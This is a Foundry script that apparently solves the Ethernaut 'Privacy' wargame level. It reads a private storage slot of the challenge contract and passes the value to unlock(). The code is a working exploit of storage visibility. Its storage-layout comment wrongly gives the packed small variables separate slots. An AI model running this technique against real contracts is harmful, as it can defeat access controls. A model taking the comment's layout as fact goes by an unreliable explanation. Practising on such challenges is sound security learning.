// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Privacy.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract PrivacySolution is Script {

    Privacy public privacyInstance = Privacy(0xf2634a7d8Ee1ab74375d96Ee9228775989b08d3A);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        console.logBool(privacyInstance.locked());
        // data[2] is at storage slot 5 (bool locked -> 0, uint256 ID ->1, uint8 flattening ->2, uint8 denomination ->3, uint16 awkwardness ->4, bytes32[3] data -> 5,6,7)
        bytes32 data2; // slot of data[2]
        data2 = vm.load(address(privacyInstance), bytes32(uint256(5))); // slot of data[2]
        privacyInstance.unlock(bytes16(data2));
        // for (uint256 i = 0; i < 8; i++) {
        //     data2 = vm.load(address(privacyInstance), bytes32(uint256(i))); // slot of data[2]
        //     privacyInstance.unlock(bytes16(data2));
        //     // console.logBytes32(data2);
        // }

        console.logBool(privacyInstance.locked());

        vm.stopBroadcast();
    }
}